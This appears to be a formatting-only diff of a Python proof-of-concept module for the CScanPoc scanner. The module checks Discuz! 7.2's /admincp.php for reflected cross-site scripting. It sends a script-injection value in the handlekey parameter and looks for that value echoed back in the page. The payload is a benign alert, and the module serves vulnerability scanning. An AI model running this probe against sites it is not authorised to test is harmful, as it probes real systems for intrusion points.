@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Discuz_0013' # 平台漏洞编号，留空
+    vuln_id = 'Discuz_0013'  # 平台漏洞编号，留空
     name = 'Discuz! 7.2 /admincp.php 跨站脚本'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.XSS # 漏洞类型
+    type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2014-11-24'  # 漏洞公布时间
     desc = '''
        Cross site scripting has benn found on /admincp.php file.
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
     product_version = '7.2'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'f7cabdb7-deb9-480e-8a3e-d09dfdd8a41c'
@@ -31,21 +33,23 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Referer:http://www.wooyun.org/bugs/wooyun-2014-084097
-            verify_url = self.target + "/admincp.php?infloat=yes&handlekey=123);alert(/cscan/);//"
+
+            # Referer:http://www.wooyun.org/bugs/wooyun-2014-084097
+            verify_url = self.target + \
+                "/admincp.php?infloat=yes&handlekey=123);alert(/cscan/);//"
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            
+
             if "if($('return_123);alert(/cscan/);//'" in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
